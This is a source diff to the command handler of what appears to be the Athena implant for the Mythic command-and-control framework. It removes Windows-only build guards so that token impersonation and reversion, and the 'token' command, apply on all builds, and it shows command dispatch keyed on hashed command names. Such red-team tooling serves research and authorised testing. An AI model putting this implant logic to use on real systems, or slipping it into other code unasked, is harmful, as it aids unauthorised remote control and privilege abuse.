@@ -35,9 +35,7 @@ namespace Athena.Commands
         private AssemblyHandler assemblyHandler { get; }
         private DownloadHandler downloadHandler { get; }
         private UploadHandler uploadHandler { get; }
-#if WINBUILD
         private TokenHandler tokenHandler { get; }
-#endif
         private ConcurrentBag<string> responseResults { get; set; }
         public CommandHandler()
         {
@@ -46,11 +44,7 @@ namespace Athena.Commands
             this.downloadHandler = new DownloadHandler();
             this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<string>();
-
-#if WINBUILD
-
             this.tokenHandler = new TokenHandler();
-#endif
         }
         /// <summary>
         /// Initiate a task provided by the Mythic server
@@ -60,7 +54,6 @@ namespace Athena.Commands
         {
             MythicJob job = PluginHandler.activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true; 
-#if WINBUILD
             if(task.token != 0)
             {
                 if(!await this.tokenHandler.ThreadImpersonate(task.token))
@@ -75,7 +68,6 @@ namespace Athena.Commands
                     return;
                 }
             }
-#endif
             switch (job.task.command.ToHash())
             {
                 case "FD456406745D816A45CAE554C788E754": //download
@@ -170,9 +162,6 @@ namespace Athena.Commands
                     SwitchProfile(job);
                     PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
-
-
-#if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                     //var tokenInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
                     var tokenInfo = Misc.ConvertJsonStringToDict(job.task.parameters);
@@ -187,7 +176,6 @@ namespace Athena.Commands
 
                     PluginHandler.activeJobs.Remove(task.id, out _);
                     break;
-#endif
                 case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                     StopInternalForwarder(job);
                     PluginHandler.activeJobs.Remove(task.id, out _); //plugin-able if we move link there
@@ -214,12 +202,10 @@ namespace Athena.Commands
 
                     break;
             }
-#if WINBUILD
             if (task.token != 0)
             {
                 await this.tokenHandler.ThreadRevert();
             }
-#endif
         }
 
         /// <summary>
